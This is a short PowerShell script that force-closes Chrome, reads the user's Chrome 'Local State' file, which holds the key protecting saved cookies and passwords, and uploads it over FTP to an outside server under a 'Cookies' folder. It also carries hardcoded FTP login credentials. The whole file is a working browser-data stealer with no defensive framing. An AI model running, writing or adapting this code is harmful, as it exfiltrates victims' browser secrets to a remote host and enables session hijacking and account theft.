# Close Chrome before running the script
try {
    Stop-Process -Name "chrome" -Force -ErrorAction Stop
    Write-Host "Chrome has been closed."
} catch {
    Write-Host "Chrome was not running."
}

# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Path to Local State file
$local_state_path = [Environment]::ExpandEnvironmentVariables("C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State")

# FTP function to upload files
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name" # Assuming /Cookies directory, adjust if necessary
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = [System.IO.File]::ReadAllBytes($file_path)
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP."
}

# Check if Local State file exists and upload
if (Test-Path $local_state_path) {
    $file_name = [System.IO.Path]::GetFileName($local_state_path)
    Upload-ToFtp -file_path $local_state_path -file_name $file_name
} else {
    Write-Host "Local State file does not exist."
}
